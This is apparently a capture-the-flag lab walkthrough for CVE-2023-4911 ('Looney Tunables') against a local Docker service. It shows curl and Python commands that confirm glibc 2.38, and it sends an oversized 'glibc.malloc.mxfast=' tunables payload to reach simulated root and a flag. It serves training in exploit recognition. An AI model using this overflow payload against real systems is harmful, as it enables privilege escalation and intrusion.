# Walkthrough: CVE-2023-4911: Looney Tunables

## Setup

```bash
docker compose up --build
```

## Step 1: Confirm the Vulnerable Version

```bash
curl http://localhost:8080/info
```

Output:
```json
{
  "glibc_version": "2.38",
  "buffer_size": 256
}
```

glibc 2.38 is in the vulnerable range (2.34–2.38).

## Step 2: Confirm Unprivileged Baseline

```bash
curl -s -X POST http://localhost:8080/run-helper \
  -H "Content-Type: application/json" \
  -d '{"glibc_tunables": "glibc.malloc.mxfast=64"}'
```

Output: `"privilege": "user"`. The helper runs as an unprivileged user with a safe value.

## Step 3: Trigger the Overflow

Send a value that starts with `glibc.malloc.mxfast=` and exceeds 256 bytes total:

```bash
python3 -c "
import json, urllib.request
payload = 'glibc.malloc.mxfast=' + 'A' * 280
req = urllib.request.Request('http://localhost:8080/run-helper',
    data=json.dumps({'glibc_tunables': payload}).encode(),
    headers={'Content-Type': 'application/json'})
print(urllib.request.urlopen(req).read().decode())
"
```

Output: `"privilege": "root"` and the flag.

## Automated

```bash
python3 exploit/exploit.py http://localhost:8080
```
